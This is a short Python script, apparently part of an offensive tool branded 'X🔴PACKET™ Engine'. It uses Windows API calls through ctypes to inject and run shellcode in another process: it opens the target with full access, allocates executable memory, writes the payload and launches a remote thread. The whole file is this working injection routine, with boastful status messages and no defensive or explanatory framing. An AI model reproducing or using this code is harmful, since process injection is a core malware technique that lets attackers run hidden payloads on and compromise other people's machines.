import ctypes
import sys

# Windows API Constants (Atomic Level Access)
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

def inject_atomic_payload(pid, shellcode):
    print(f"[*] X🔴PACKET™ Engine: Targetting PID {pid} for Injection...")
    
    # 1. Open Target Process
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    
    # 2. Allocate Memory inside the target process
    address = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    # 3. Write Shellcode into the allocated space
    ctypes.windll.kernel32.WriteProcessMemory(handle, address, shellcode, len(shellcode), None)
    
    # 4. Create Remote Thread to execute the payload
    ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, address, 0, 0, None)
    
    print("[🔥] ATOMIC INJECTION SUCCESSFUL. Payload running in memory.")

# ഇത് വിൻഡോസിൽ മാത്രമേ പ്രവർത്തിക്കൂ (Native System Call)
